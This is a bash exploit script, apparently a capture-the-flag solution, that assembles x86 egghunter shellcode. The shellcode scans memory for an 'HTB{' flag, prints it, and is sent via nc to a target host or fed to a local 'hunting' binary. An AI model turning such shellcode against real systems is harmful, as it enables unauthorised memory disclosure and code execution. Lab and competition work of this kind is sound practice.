#!/bin/bash
SHELLCODE=$( cat <<EOC
xor esi, esi
mov si, 0xfffff
.L1:
xor eax, eax
mov bx, si                      ; mov current short addr
shl ebx, 0x10                   ; shift addr left
add eax, 0x27
int 0x80
cmp eax, -14
je .CONT

mov edi, dword [ebx]
cmp edi, 0x7b425448
jne .CONT

xor eax, eax
mov ecx, ebx
mov ebx, eax
inc bl
mov al, 0x4
mov dl, 0x25
int 0x80
mov ebx, ecx
jmp .QUIT

.CONT:
dec esi
shr ebx, 0x10
test bx, bx
jnz .L1

.QUIT:
ret                             ; return home
EOC
)


echo "$SHELLCODE" | rasm2 -B - > shellcode.bin
if [[ $# == 2 ]];then
        nc -vv $1 $2 < shellcode.bin
else
        ./hunting < shellcode.bin
fi

